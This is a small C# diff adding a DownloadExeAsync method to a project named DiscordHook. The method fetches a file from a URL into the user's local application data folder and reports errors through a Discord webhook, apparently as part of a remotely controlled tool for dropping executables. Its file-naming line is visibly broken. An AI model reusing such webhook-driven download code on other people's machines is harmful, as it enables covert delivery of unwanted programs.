@@ -85,9 +85,20 @@ namespace DiscordHook
             }
         }
 
-        public static async Task<string> DownloadExeAsync(string url)
+        public static async Task<string> DownloadExeAsync(string url, string replyhook)
         {
-            return "he";
+            try
+            {
+                using var stream = await new HttpClient().GetStreamAsync(url);
+                using var fileStream = new FileStream(@$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\DiscordHook\{url.Substring(0, 10)}", FileMode.CreateNew);
+                await stream.CopyToAsync(fileStream);
+                return url.Substring(0,10);         //will find a cleaner way to name the downloaded file
+            }
+            catch
+            {
+                await SendStringHook("error, could not download the file",replyhook);
+                return "error";
+            }
         }
     }
 }
